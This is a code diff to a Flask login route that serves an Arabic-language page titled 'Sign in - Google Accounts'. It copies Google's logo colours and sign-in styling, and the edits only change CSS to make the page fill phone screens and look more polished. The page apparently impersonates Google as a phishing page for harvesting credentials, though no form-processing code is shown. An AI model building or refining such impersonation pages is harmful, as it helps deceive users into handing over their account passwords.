@@ -41,18 +41,18 @@ def login():
     <title>تسجيل الدخول - حسابات Google</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
-        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 0; }
+        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 0; margin: 0; }
         
-        /* تصميم ملء الشاشة للموبايل */
-        .google-card { background: #fff; width: 100%; height: 100vh; max-width: none; padding: 30px 20px; border: none; border-radius: 0; text-align: center; display: flex; flex-direction: column; justify-content: center; }
+        /* تمديد الصفحة لتملأ الشاشة بالكامل على الهواتف */
+        .google-card { background: #fff; width: 100%; height: 100vh; padding: 40px 25px; border: none; border-radius: 0; text-align: center; display: flex; flex-direction: column; justify-content: center; }
 
-        /* للشاشات الكبيرة (الكمبيوتر) تظهر كبطاقة مرتبة في المنتصف */
-        @media (min-width: 480px) {
-            body { background: #fff; padding: 20px; }
+        /* للشاشات الكبيرة (الكمبيوتر) تعود كبطاقة متوسطة في المنتصف */
+        @media (min-width: 768px) {
+            body { background: #f0f2f5; padding: 20px; }
             .google-card { height: auto; max-width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
         }
 
-        .google-logo { font-size: 28px; font-weight: 500; margin-bottom: 10px; letter-spacing: -0.5px; }
+        .google-logo { font-size: 32px; font-weight: 500; margin-bottom: 12px; letter-spacing: -0.5px; }
         .google-logo span:nth-child(1) { color: #4285F4; }
         .google-logo span:nth-child(2) { color: #EA4335; }
         .google-logo span:nth-child(3) { color: #FBBC05; }
@@ -60,14 +60,14 @@ def login():
         .google-logo span:nth-child(5) { color: #34A853; }
         .google-logo span:nth-child(6) { color: #EA4335; }
 
-        h2 { color: #202124; font-size: 24px; font-weight: 400; margin-bottom: 8px; }
-        p { color: #5f6368; font-size: 16px; margin-bottom: 30px; }
+        h2 { color: #202124; font-size: 26px; font-weight: 400; margin-bottom: 8px; }
+        p { color: #5f6368; font-size: 16px; margin-bottom: 35px; }
 
         .input-group { margin-bottom: 20px; text-align: right; }
         .input-group input { width: 100%; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s; background: transparent; }
         .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px; }
 
-        .submit-btn { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
+        .submit-btn { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
         .submit-btn:hover { background: #1557b0; }
     </style>
 </head>
